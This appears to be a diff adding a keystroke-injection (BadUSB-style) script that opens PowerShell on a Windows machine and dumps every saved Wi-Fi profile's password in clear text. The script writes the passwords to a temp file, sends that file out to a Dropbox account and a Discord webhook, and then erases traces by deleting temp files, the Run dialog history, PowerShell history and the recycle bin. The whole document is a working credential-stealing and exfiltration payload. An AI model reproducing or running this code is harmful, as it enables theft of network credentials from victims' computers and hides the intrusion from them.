@@ -1,0 +1,139 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+ENTER
+ENTER
+ALTCODE $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+ENTER
+ENTER
+ENTER
+STRING $wifiProfiles > $env:TEMP/--wifi-pass.txt
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+STRING function DropBox-Upload {
+ENTER
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING param (
+ENTER
+ENTER
+STRING [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+ENTER
+ALTCODE [Alias("f")]
+ENTER
+STRING [string]$SourceFilePath
+ENTER
+STRING )
+ENTER
+STRING $outputFile = Split-Path $SourceFilePath -leaf
+ENTER
+ALTCODE $TargetFilePath="/$outputFile"
+ENTER
+ALTCODE $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+ENTER
+ALTCODE $authorization = "Bearer " + $db
+ENTER
+ALTCODE $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+ENTER
+ALTCODE $headers.Add("Authorization", $authorization)
+ENTER
+ALTCODE $headers.Add("Dropbox-API-Arg", $arg)
+ENTER
+ALTCODE $headers.Add("Content-Type", 'application/octet-stream')
+ENTER
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+ENTER
+STRING }
+ENTER
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
+ENTER
+ENTER
+ENTER
+ENTER
+STRING function Upload-Discord {
+ENTER
+ENTER
+STRING [CmdletBinding()]
+ENTER
+STRING param (
+ENTER
+STRING [parameter(Position=0,Mandatory=$False)]
+ENTER
+STRING [string]$file,
+ENTER
+STRING [parameter(Position=1,Mandatory=$False)]
+ENTER
+STRING [string]$text
+ENTER
+STRING )
+ENTER
+ENTER
+ALTCODE $hookurl = "$dc"
+ENTER
+ENTER
+STRING $Body = @{
+ENTER
+ALTCODE 'username' = $env:username
+ENTER
+ALTCODE 'content' = $text
+ENTER
+STRING }
+ENTER
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+ENTER
+ALTCODE Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+ENTER
+ENTER
+ALTCODE if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+ENTER
+STRING }
+ENTER
+ENTER
+ALTCODE if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+STRING function Clean-Exfil {
+ENTER
+ENTER
+ENTER
+STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+ENTER
+ENTER
+ENTER
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+ENTER
+ENTER
+ENTER
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+ENTER
+ENTER
+ENTER
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ENTER
+ENTER
+STRING }
+ENTER
+ENTER
+ENTER
+ENTER
+STRING if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+ENTER
+ENTER
+ENTER
+STRING RI $env:TEMP/--wifi-pass.txt
+ENTER
+
